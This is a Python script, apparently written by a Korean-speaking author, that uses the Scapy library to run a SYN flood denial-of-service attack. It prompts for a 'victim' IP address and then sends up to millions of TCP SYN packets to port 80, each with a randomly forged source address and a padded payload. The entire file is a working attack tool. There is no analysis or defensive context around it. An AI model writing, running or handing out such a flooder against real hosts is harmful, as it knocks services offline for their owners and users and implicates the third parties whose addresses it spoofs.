from scapy.all import *
import random
import ipaddress

class VictimDevice:
    def __init__(self, ip_addr):
        self.ip_addr = ip_addr

def show_banner():
    print("<< SYN FLOOD 공격")
    print("[!] By 김가빈")
    print("[!] Python: 김가빈")
    print()
    print("[*] 인터페이스: {}".format(conf.iface))

def get_victim_ip():
    while True:
        victim_ip = input("[*] 피해자의 아이피를 써 넣으시오: ")
        if is_valid_ip(victim_ip):
            return VictimDevice(victim_ip)
        else:
            print("Invalid IP Address. Please enter a valid IP.")

def is_valid_ip(ip):
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False

def generate_packet(victim_ip):
    packetIP = IP()
    packetIP.src = ".".join(map(str, (random.randint(1, 254) for _ in range(4))))
    packetIP.dst = victim_ip.ip_addr
    packetTCP = TCP()
    packetTCP.sport = RandShort()
    packetTCP.dport = 80
    packetTCP.flags = 'S'

    raw = Raw(b"N" * 1024)
    return packetIP / packetTCP / raw

def run_attack(victim):
    try:
        for x in range(0, 9999999):
            packet = generate_packet(victim)
            send(packet, verbose=0)
            print("Sent packet {}".format(x))
    except KeyboardInterrupt:
        print("Attack stopped by the user.")
    except Exception as e:
        print("An error occurred during the attack: {}".format(e))

def main():
    show_banner()
    victim = get_victim_ip()
    print("Attack {} ...".format(victim.ip_addr))
    run_attack(victim)

if __name__ == '__main__':
    main()